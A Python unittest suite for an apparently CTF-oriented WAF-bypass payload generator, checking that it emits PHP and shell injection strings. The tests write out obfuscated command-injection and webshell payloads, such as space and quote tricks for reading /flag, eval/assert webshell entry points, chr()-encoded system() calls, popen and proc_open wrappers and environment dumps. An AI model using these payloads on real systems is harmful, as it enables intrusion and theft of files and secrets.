import unittest
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from PureWaf import bypass
from PureWaf import bypass_data
#from PureWaf import PureWaf as core
from PureWaf import utils

class TestNewTechniques(unittest.TestCase):
    
    def test_filename_obfuscation(self):
        # 测试插入转义符
        path = "flag.php"
        escaped = utils.obfuscate_filename_escape(path)
        # 长度允许时应包含反斜杠
        if "\\" in escaped:
            print(f"Escaped path: {escaped}")
            self.assertIn("\\", escaped)
            self.assertNotEqual(escaped, path)
            
        # 测试插入引号
        quoted = utils.obfuscate_filename_quotes(path)
        if "''" in quoted:
            print(f"Quoted path: {quoted}")
            self.assertIn("''", quoted)
            self.assertNotEqual(quoted, path)

    def test_include_payloads(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含文件包含包装形式
        found_include = False
        for p in payloads:
            if "include" in p and "php://" in p:
                found_include = True
                break
        self.assertTrue(found_include, "Include with php://filter not found")

    def test_webshell_templates(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含执行入口
        found_eval = False
        for p in payloads:
            if "eval($_GET" in p or "assert($_POST" in p:
                found_eval = True
                break
        self.assertTrue(found_eval, "Webshell eval/assert payload not found")
        self.assertTrue(any("call_user_func_array" in p for p in payloads), "call_user_func_array payload not found")
        self.assertTrue(any("array_map(" in p for p in payloads), "array_map payload not found")
        self.assertTrue(any("preg_replace('/.*/e'" in p for p in payloads), "preg_replace /e payload not found")
        self.assertTrue(any("create_function" in p for p in payloads), "create_function payload not found")

    def test_new_commands(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含编辑器命令
        found_vi = any(p.startswith("vi ") for p in payloads)
        self.assertTrue(found_vi, "vi command not found")
        
        # 检查是否包含过滤命令
        found_grep = any("grep" in p and "flag" in p for p in payloads)
        self.assertTrue(found_grep, "grep command not found")

    def test_commix_inspired_readfile_payloads(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.0,
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn("cat${IFS}/flag", payloads)
        self.assertIn("c''a''t /flag", payloads)
        self.assertIn('c""a""t /flag', payloads)
        self.assertNotIn("c\\a\\t /flag", payloads)
        self.assertIn("echo $(</flag)", payloads)
        self.assertIn("while read line;do echo $line;done</flag", payloads)

    def test_directory_enumeration_templates(self):
        options = bypass.BypassOptions(
            flagfile="/",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn(
            "print_r(scandir(dirname(dirname(__FILE__))));",
            payloads,
            "Nested dirname+scandir payload not found",
        )
        self.assertIn(
            "var_export(glob('../*'));",
            payloads,
            "glob directory payload not found",
        )

    def test_read_env_only_env_payloads(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=True,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0,
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn("env", payloads)
        self.assertIn("printenv", payloads)
        self.assertIn("set", payloads)
        self.assertNotIn("print_r(scandir('/'));", payloads)
        self.assertNotIn("var_export(glob('../*'));", payloads)

    def test_file_enumeration_templates(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn(
            "show_source(next(array_reverse(scandir(getcwd()))));",
            payloads,
            "next(array_reverse(scandir(...))) payload not found",
        )

    def test_variable_scope_hijacking_template(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True, 
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn(
            "eval(array_pop(next(get_defined_vars())));",
            payloads,
            "Variable scope hijacking payload not found",
        )

    def test_backtick_templates_support_arbitrary_commands(self):
        payloads = bypass._generate_php_rce_payloads("whoami", php_version=8.0)
        self.assertIn("`whoami`", payloads)
        self.assertIn("echo `whoami`;", payloads)
        self.assertIn("print(`whoami`);", payloads)
        self.assertIn("var_dump(`whoami`);", payloads)
        self.assertIn("die(`whoami`);", payloads)
        self.assertIn("exit(`whoami`);", payloads)

        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.0,
        )
        generated = bypass.generate_candidates(options)
        self.assertIn("echo `tac /flag`;", generated)
        self.assertIn("print(`cat /flag`);", generated)

    def test_payload_context_php_code_prefers_eval_safe_payloads(self):
        root_options = bypass.BypassOptions(
            flagfile="/",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.0,
            payload_context="php_code",
        )
        root_payloads = bypass.generate_candidates(root_options)
        self.assertIn("echo `ls /`;", root_payloads)
        self.assertNotIn("ls /", root_payloads)

        flag_options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.0,
            payload_context="php_code",
        )
        flag_payloads = bypass.generate_candidates(flag_options)
        self.assertIn("echo `cat /flag`;", flag_payloads)
        self.assertNotIn("cat /flag", flag_payloads)
        self.assertNotIn("`cat /flag`", flag_payloads)
        self.assertNotIn("$'\\154\\163'", flag_payloads)

    def test_readfile_templates_exclude_directory_listing_entries(self):
        self.assertNotIn("ls {path}", bypass_data.READFILE_TEMPLATES)
        self.assertNotIn("b=l;c=s;d={path};$b$c $d", bypass_data.READFILE_TEMPLATES)

    def test_php_exec_wrappers_for_popen_and_proc_open(self):
        self.assertIn("popen", bypass_data.PHP_EXEC_WRAPPERS)
        self.assertIn("proc_open", bypass_data.PHP_EXEC_WRAPPERS)

        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)
        popen_payloads = [p for p in payloads if "popen(" in p]
        proc_open_payloads = [p for p in payloads if "proc_open(" in p]

        self.assertTrue(popen_payloads, "popen payload not found")
        self.assertTrue(proc_open_payloads, "proc_open payload not found")
        self.assertTrue(any("'r'" in p and "stream_get_contents" in p for p in popen_payloads))
        self.assertTrue(any("$__spec=" in p and "$__pipes" in p for p in proc_open_payloads))

    def test_chr_payloads(self):
        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)

        self.assertIn(
            f"$_={utils.generate_php_chr('system')};$_({utils.generate_php_chr('id')});",
            payloads,
        )

        chr_popen = utils.generate_php_chr("popen")
        chr_proc_open = utils.generate_php_chr("proc_open")
        self.assertTrue(
            any("$__f=" in p and chr_popen in p and "stream_get_contents" in p for p in payloads),
            "chr popen payload not found",
        )
        self.assertTrue(
            any("$__f=" in p and chr_proc_open in p and "$__spec=" in p for p in payloads),
            "chr proc_open payload not found",
        )

    def test_phpinfo_chr_payload_present(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=8.0,
        )
        payloads = bypass.generate_candidates(options)
        self.assertIn(f"$_={utils.generate_php_chr('phpinfo')};$_();", payloads)

    def test_nan_post_gateway_payload_present(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.0,
        )
        payloads = bypass.generate_candidates(options)
        self.assertIn(utils.generate_nan_seed_post_gateway(), payloads)

    def test_chr_payloads_do_not_couple_with_not_xor_increment(self):
        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)
        chr_payloads = [p for p in payloads if "chr(" in p]
        self.assertTrue(chr_payloads, "chr payloads not generated")

        for payload in chr_payloads:
            self.assertNotIn("(~'", payload)
            self.assertNotIn("^", payload)

        increment_payloads = [p for p in payloads if "$_____(" in p]
        self.assertTrue(increment_payloads, "increment payloads not generated")
        for payload in increment_payloads:
            self.assertNotIn("chr(", payload)

    def test_increment_payload_url_encoded_rce(self):
        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)
        raw_increment_payloads = [p for p in payloads if "$_____(" in p]
        self.assertTrue(raw_increment_payloads, "raw increment payload not found")

        raw_payload = raw_increment_payloads[0]
        encoded_payload = utils.url_encode(raw_payload)
        self.assertIn(encoded_payload, payloads)

    def test_increment_payload_url_encoded_phpinfo(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=8.0,
        )
        payloads = bypass.generate_candidates(options)

        raw_increment_payloads = [p for p in payloads if "$_____();" in p]
        self.assertTrue(raw_increment_payloads, "raw phpinfo increment payload not found")

        raw_payload = raw_increment_payloads[0]
        encoded_payload = utils.url_encode(raw_payload)
        self.assertIn(encoded_payload, payloads)

if __name__ == '__main__':
    unittest.main()
